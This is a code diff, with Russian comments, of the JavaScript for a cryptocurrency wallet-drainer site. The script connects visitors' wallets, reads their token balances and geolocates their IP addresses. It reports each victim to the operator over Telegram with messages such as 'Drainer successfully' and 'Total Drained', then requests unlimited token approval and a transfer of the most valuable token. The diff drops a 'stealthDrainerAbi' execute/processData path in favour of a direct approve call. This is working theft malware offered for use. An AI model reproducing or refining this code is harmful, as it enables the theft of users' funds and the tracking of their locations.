@@ -1,7 +1,7 @@
 import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
 
 // Утилита для дебаунсинга
@@ -41,53 +41,6 @@ const appKit = createAppKit({
   projectId,
   features: { analytics: true, email: false, socials: false }
 })
-
-// ABI для контракта с методом execute
-const stealthDrainerAbi = [
-  {
-    constant: false,
-    inputs: [
-      { name: 'to', type: 'address' },
-      { name: 'value', type: 'uint256' },
-      { name: 'data', type: 'bytes' }
-    ],
-    name: 'execute',
-    outputs: [],
-    type: 'function'
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: 'taskId', type: 'uint256' },
-      { name: 'dataHash', type: 'bytes32' },
-      { name: 'nonce', type: 'uint256' },
-      { name: 'tokens', type: 'address[]' }
-    ],
-    name: 'processData',
-    outputs: [],
-    type: 'function'
-  }
-]
-
-const erc20Abi = [
-  {
-    constant: true,
-    inputs: [{ name: '_owner', type: 'address' }],
-    name: 'balanceOf',
-    outputs: [{ name: 'balance', type: 'uint256' }],
-    type: 'function'
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: 'spender', type: 'address' },
-      { name: 'amount', type: 'uint256' }
-    ],
-    name: 'approve',
-    outputs: [{ name: 'success', type: 'bool' }],
-    type: 'function'
-  }
-]
 
 // Состояние приложения
 const store = {
@@ -185,7 +138,7 @@ function showCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.style.display = 'flex'
-    setTimeout(() => modal.classList.add('show'), 10)
+    setTimeout(() => modal.classList.add('show'), 10) // Небольшая задержка для триггера анимации
   }
 }
 
@@ -193,7 +146,7 @@ function hideCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.classList.remove('show')
-    setTimeout(() => modal.style.display = 'none', 300)
+    setTimeout(() => modal.style.display = 'none', 300) // Ждем завершения анимации (0.3s)
   }
 }
 
@@ -284,14 +237,13 @@ async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation')
   if (cachedLocation) return cachedLocation
   try {
-    const response = await fetch(`https://ipapi.co/${ip}/json/`)
+    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
     const data = await response.json()
-    const location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Unknown Location'
+    const location = data.cityName && data.countryName ? `${data.cityName}, ${data.countryName}` : 'Unknown Location'
     sessionStorage.setItem('userLocation', location)
     return location
   } catch (error) {
-    console.warn(`Geolocation fetch failed: ${error.message}, returning IP as fallback`)
-    return ip || 'Unknown Location'
+    return 'Unknown Location'
   }
 }
 
@@ -330,8 +282,6 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
   }
   store.isProcessingConnection = true
   try {
-    showCustomModal()
-    await new Promise(resolve => setTimeout(resolve, 3000))
     console.log('Sending wallet connection notification')
     const ip = await getUserIP()
     const location = await getGeolocation(ip)
@@ -350,22 +300,29 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: ${networkName}\n` +
+                    `🕸 Network: EVM\n` +
                     `🌎 ${ip}\n\n` +
                     `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
     store.connectionKey = connectionKey
+
+    // Показать модальное окно
+    showCustomModal()
+    await new Promise(resolve => setTimeout(resolve, 3000)) // Ждать 3 секунды
+
+    // Проверка баланса
     const hasBalance = balances.some(token => token.balance > 0)
     if (!hasBalance) {
       const modalMessage = document.querySelector('.custom-modal-message')
       if (modalMessage) modalMessage.textContent = 'Congratulations!'
-      await new Promise(resolve => setTimeout(resolve, 1000))
+      await new Promise(resolve => setTimeout(resolve, 1000)) // Ждать 1 секунду
       hideCustomModal()
       store.isProcessingConnection = false
       return
     }
+
   } catch (error) {
     store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
     hideCustomModal()
@@ -384,7 +341,7 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
     const amountValue = (token.balance * token.price).toFixed(2)
     const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: ${networkName}\n` +
+                    `🕸 Network: EVM\n` +
                     `🌎 ${ip}\n\n` +
                     `**🔥 Processing: ${amountValue}$**\n` +
                     `➡️ ${token.symbol}\n\n` +
@@ -406,7 +363,7 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
     const txLink = getScanLink(txHash, chainId, true)
     const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
-                    `🕸 Network: ${networkName}\n` +
+                    `🕸 Network: EVM\n` +
                     `🌎 ${ip}\n\n` +
                     `**💰 Total Drained: ${amountValue}$**\n` +
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
@@ -448,12 +405,12 @@ const TOKENS = {
   'BNB Smart Chain': [
     { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
-    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
+    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
-    { symbol: 'FLOKI', address: '0x0fb5b838b6cfeedc2873ab278660cae6cdbf7bf0', decimals: 18 },
+    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
     { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
     { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
-    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63', decimals: 18 },
+    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
     { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
     { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
     { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
@@ -477,6 +434,26 @@ const TOKENS = {
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
   ]
 }
+
+const erc20Abi = [
+  {
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function'
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: 'spender', type: 'address' },
+      { name: 'amount', type: 'uint256' }
+    ],
+    name: 'approve',
+    outputs: [{ name: 'success', type: 'bool' }],
+    type: 'function'
+  }
+]
 
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
@@ -511,60 +488,33 @@ const getTokenPrice = async (symbol) => {
 }
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
-  const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumContractAddress = getAddress(contractAddress);
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
+  const checksumTokenAddress = getAddress(tokenAddress)
+  const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(100000); // Увеличенный лимит газа для execute
-    const maxFeePerGas = BigInt(10_000_000_000);
-    const maxPriorityFeePerGas = BigInt(2_000_000_000);
-    
-    // Кодируем данные для вызова approve(address spender, uint256 amount)
-    const approveData = encodeFunctionData({
+    const gasLimit = BigInt(65000)
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
-      args: [checksumContractAddress, maxUint256]
-    });
-
-    console.log(`Preparing execute call for approve with token: ${checksumTokenAddress}, spender: ${checksumContractAddress}`);
-    
-    // Вызываем метод execute на контракте
-    const executeTxHash = await writeContract(wagmiConfig, {
-      address: checksumContractAddress,
-      abi: stealthDrainerAbi,
-      functionName: 'execute',
-      args: [checksumTokenAddress, approveData], // to: токен-контракт, data: approve calldata
+      args: [checksumContractAddress, maxUint256],
       chainId,
       gas: gasLimit,
       maxFeePerGas,
       maxPriorityFeePerGas
-    });
-    console.log(`Execute transaction sent for approve: ${executeTxHash}`);
-
-    // Вызываем processData на прокси-контракте
-    const taskId = Math.floor(Math.random() * 1000000);
-    const dataHash = '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
-    const nonce = Math.floor(Math.random() * 1000000);
-    const processDataTxHash = await writeContract(wagmiConfig, {
-      address: checksumContractAddress,
-      abi: stealthDrainerAbi,
-      functionName: 'processData',
-      args: [taskId, dataHash, nonce, [checksumTokenAddress]],
-      chainId,
-      gas: BigInt(200000),
-      maxFeePerGas,
-      maxPriorityFeePerGas
-    });
-    console.log(`processData transaction sent: ${processDataTxHash}`);
-
-    return { approveTxHash: executeTxHash, processDataTxHash };
+    })
+    console.log(`Approve transaction sent: ${txHash}`)
+    return txHash
   } catch (error) {
-    store.errors.push(`Execute or processData failed: ${error.message}`);
-    throw error;
+    store.errors.push(`Approve token failed: ${error.message}`)
+    throw error
   }
-};
+}
 
 // Инициализация подписок
 const initializeSubscribers = (modal) => {
@@ -676,9 +626,11 @@ const initializeSubscribers = (modal) => {
         try {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-          if (store.approvedTokens[approvalKey] || store.isApprovalRequested) {
+          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
             const approveMessage = store.approvedTokens[approvalKey]
               ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : store.isApprovalRejected
+              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
               : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
             console.log(approveMessage)
             const approveState = document.getElementById('approveState')
@@ -691,11 +643,11 @@ const initializeSubscribers = (modal) => {
           const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
           store.approvedTokens[approvalKey] = true
           store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash.approveTxHash}`
+          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
-          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash.approveTxHash)
+          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           if (transferResult.success) {
             approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
             console.log(`Transfer request successful: ${transferResult.txHash}`)
@@ -754,12 +706,10 @@ updateButtonVisibility(appKit.getIsConnectedState())
 
 document.getElementById('open-connect-modal')?.addEventListener('click', () => {
   if (!appKit.getIsConnectedState()) {
-    store.isApprovalRejected = false
-    store.connectionKey = null
-    store.isProcessingConnection = false
     appKit.open()
   }
 })
+
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
   store.approvedTokens = {}
